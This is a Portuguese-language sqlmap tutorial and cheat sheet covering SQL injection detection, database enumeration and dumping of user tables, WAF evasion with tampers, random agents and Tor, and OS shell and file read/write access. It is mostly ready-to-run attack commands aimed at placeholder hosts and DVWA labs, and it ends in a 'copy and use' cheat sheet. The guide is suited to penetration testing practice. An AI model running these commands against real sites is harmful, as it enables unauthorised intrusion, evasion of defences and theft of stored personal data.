# SQLMap

## 1) Instalação e checagem

No Kali, o sqlmap já vem instalado. Para conferir:

```bash
sqlmap --version
sqlmap -hh    # ajuda completa (útil para pesquisar switches)
```

## 2) Conceito rápido

O sqlmap:

* Detecta e explora **SQL Injection** automaticamente.
* Suporta GET/POST/JSON, cookies, headers, etc.
* Faz **fingerprinting** do SGBD, enumera DBs, tabelas/colunas e pode **dump** de dados.
* Possui modos para **bypass** básico de WAF/filtragens (tamper scripts), **proxy**, **Tor**.

## 3) Quickstart (GET simples)

Supondo uma página de teste com parâmetro `id`:

```bash
sqlmap -u "http://alvo.test/produto.php?id=1" --batch
```

* `--batch`: responde automaticamente prompts (bom para scripts).
* O sqlmap tentará detectar e, se existir, mostrar o tipo de SQLi e o SGBD.

## 4) POST/JSON, formulários e parâmetros

### POST (form padrão)

```bash
sqlmap -u "http://alvo.test/login" --data="user=teste&pass=senha" -p user --batch
```

* `--data`: corpo da requisição (POST).
* `-p user`: força testar somente o parâmetro `user` (evita falso-positivo em outros).

### JSON / API

```bash
sqlmap -u "http://api.alvo.test/v1/items" \
  --data='{"id":1,"q":"abc"}' --batch --parse-errors
```

### Capturar formulários da página

```bash
sqlmap -u "http://alvo.test/pesquisa" --forms --batch
```

## 5) Cookies, sessões e headers

Se o alvo exige login (ex.: DVWA):

```bash
sqlmap -u "http://alvo.test/vuln.php?id=1" \
  --cookie="PHPSESSID=abc123; security=low" \
  --batch
```

Headers customizados:

```bash
sqlmap -u "http://alvo.test" --headers="X-Api-Key: 123\nX-Requested-With: XMLHttpRequest"
```

Autenticação HTTP:

```bash
sqlmap -u "http://alvo.test/area" --auth-type=basic --auth-cred="user:senha"
```

## 6) Escopo e crawling

### Restringir a um domínio e varrer links

```bash
sqlmap -u "http://alvo.test" --crawl=2 --scope="alvo\.test" --batch
```

* `--crawl=2`: segue links até 2 níveis.
* `--scope`: só testa URLs que casem com a regex (evita sair do escopo).

## 7) Fingerprinting e foco no SGBD

Para acelerar (se você suspeita do SGBD):

```bash
sqlmap -u "http://alvo.test?id=1" --dbms=mysql --batch
```

Fingerprint detalhado:

```bash
sqlmap -u "http://alvo.test?id=1" --fingerprint
```

## 8) Enumeração (dbs, tabelas, colunas) e dump

Fluxo clássico de extração:

```bash
# 1) Listar bancos
sqlmap -u "http://alvo.test?id=1" --dbs

# 2) Listar tabelas de um banco
sqlmap -u "http://alvo.test?id=1" -D meu_banco --tables

# 3) Listar colunas de uma tabela
sqlmap -u "http://alvo.test?id=1" -D meu_banco -T usuarios --columns

# 4) Fazer dump seletivo
sqlmap -u "http://alvo.test?id=1" -D meu_banco -T usuarios -C id,login,email --dump
```

Outros úteis:

```bash
sqlmap -u "http://alvo.test?id=1" --tables -D meu_banco --search -T usuarios
sqlmap -u "http://alvo.test?id=1" --schema     # esquema completo (pode ser verboso)
```

## 9) Ajustando testes: level, risk, técnica e tempo

* `--level` (1–5): **quantidade** de testes por parâmetro (mais alto = mais lento e profundo).
* `--risk` (1–3): agressividade (3 pode causar efeitos colaterais).
* `--technique=BEUST`: restringe técnicas (B=Boolean, E=Error, U=Union, S=Stacked, T=Time).

Exemplos:

```bash
# Testes mais profundos e time-based
sqlmap -u "http://alvo.test?id=1" --level=5 --risk=2 --technique=BT --time-sec=5

# Forçar UNION e boolean apenas
sqlmap -u "http://alvo.test?id=1" --technique=UB
```

## 10) Performance, estabilidade e evasão

* **Threads** (cuidado com alvos frágeis): `--threads=5`
* **User-Agent aleatório**: `--random-agent`
* **Delays/timeout/retries**: `--delay=0.5 --timeout=20 --retries=2`
* **Proxy (ex.: Burp/ZAP)**: `--proxy="http://127.0.0.1:8080"`
* **Tor** (para laboratórios na internet): `--tor --tor-type=socks5 --check-tor`
* **Identificar WAF**: `--identify-waf`
* **Tampers** (bypass básicos): `--tamper=space2comment,between,randomcase,charunicodeencode`

  * Liste disponíveis: `--list-tampers`

Exemplo combinado:

```bash
sqlmap -u "http://alvo.test?id=1" \
  --level=5 --risk=2 --threads=5 --random-agent \
  --proxy="http://127.0.0.1:8080" --identify-waf \
  --tamper=space2comment,randomcase --batch
```

## 11) Precisão em parâmetros e páginas

Se só **um** parâmetro é vulnerável:

```bash
sqlmap -u "http://alvo.test/busca?q=test&cat=10&ord=asc" -p cat
```

Para **forçar** um ponto específico no corpo (POST/JSON) use `-p` com o nome do campo correspondente.

## 12) Sessões, saída e repetibilidade

* O sqlmap salva resultados em `output/<host>/`.
* **Retomar** automaticamente ao reexecutar o mesmo alvo.
* **Limpar sessão**: `--flush-session`
* **Diretório de saída** customizado: `--output-dir=/tmp/sqlmap_out`

## 13) Integração com Burp/ZAP

Capture a requisição **exata** (com cookies/headers/autenticação) pelo Burp/ZAP e **salve** em arquivo (`.txt`). Depois:

```bash
sqlmap -r /caminho/requisicao.txt --batch
```

> Esta é a forma mais confiável para alvos com autenticação, tokens dinâmicos, headers específicos etc.

## 14) Em ambientes de laboratório (DVWA/bWAPP/Juice Shop)

Exemplo DVWA (local), após logar no app e copiar os cookies:

```bash
sqlmap -u "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=...; security=low" \
  -p id --dbms=mysql --batch --level=3 --risk=1
```

## 15) Recursos avançados (apenas em laboratório próprio!)

> **Use somente em ambientes seus**; são ações intrusivas.

* **SQL shell** (executar SQL direto): `--sql-shell`
* **OS shell/OS command** (se houver RCE via DB): `--os-shell`
* **Leitura/Escrita de arquivos** via SGBD: `--file-read`, `--file-write`, `--file-dest`

## 16) Dicas de troubleshooting

* Página muito dinâmica? Use `-r` com a requisição exata do Burp/ZAP.
* Muitos falsos negativos? Aumente `--level`, tente `--technique=BT`, suba `--time-sec`.
* Desconfia de filtro WAF? `--identify-waf` e experimente `--tamper` diferentes.
* Token CSRF quebra o teste? Faça login manual, capture a requisição já autenticada (`-r`), ou ajuste fluxo para enviar o token válido.

---

## Cheatsheet essencial (copiar e usar)

```bash
# GET simples
sqlmap -u "http://alvo/x.php?id=1" --batch

# POST com parâmetro-alvo
sqlmap -u "http://alvo/login" --data="u=teste&p=123" -p u --batch

# Requisição do Burp
sqlmap -r req.txt --batch

# Enumeração completa (com foco em MySQL)
sqlmap -u "http://alvo/x.php?id=1" --dbms=mysql --dbs
sqlmap -u "http://alvo/x.php?id=1" -D banco --tables
sqlmap -u "http://alvo/x.php?id=1" -D banco -T tabela --columns
sqlmap -u "http://alvo/x.php?id=1" -D banco -T tabela --dump

# Mais profundo e evasivo
sqlmap -u "http://alvo/x.php?id=1" --level=5 --risk=2 --technique=BT \
       --threads=5 --random-agent --identify-waf \
       --tamper=space2comment,randomcase --batch
```
